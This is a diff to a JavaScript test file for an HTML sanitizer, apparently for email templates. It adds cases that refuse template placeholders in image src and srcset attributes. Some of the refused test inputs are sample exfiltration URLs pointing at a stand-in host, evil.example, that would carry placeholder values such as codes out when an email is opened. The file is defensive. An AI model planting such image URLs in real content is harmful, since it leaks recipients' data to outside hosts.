@@ -173,7 +173,11 @@ test('<image> is read as the void <img> it is, and attr() is refused in any CSS'
 test('html-safety allows <img src="https://..."> with alt, and refuses data: and http:', () => {
   allowed('<p><img src="https://app.onhomeroom.com/email-images/0123456789abcdef0123456789abcdef" alt="Our team" width="480" height="240" style="display:block;max-width:100%;height:auto;border:0"></p>');
   allowed('<img src="https://x.example/a.png" alt="">');
-  allowed('<img src="{{url}}" alt="">');
+  // A placeholder in an image's address would be fetched on open, value and all.
+  refused('<img src="{{url}}" alt="">', /cannot hold a placeholder/);
+  refused('<img src="https://evil.example/p.gif?u={{url}}" alt="">', /cannot hold a placeholder/);
+  refused('<img src=" {{url}}" alt="">', /cannot hold a placeholder/);
+  refused('<img src="https://x.example/a.png" srcset="https://evil.example/{{code}}.png 2x" alt="">', /cannot hold a placeholder/);
   allowed('<IMG SRC="HTTPS://X.EXAMPLE/A.PNG" ALT="">');
   refused('<img src="data:image/png;base64,AAAA" alt="">', /data/);
   refused('<img src="http://x.example/a.png" alt="">', /https/);
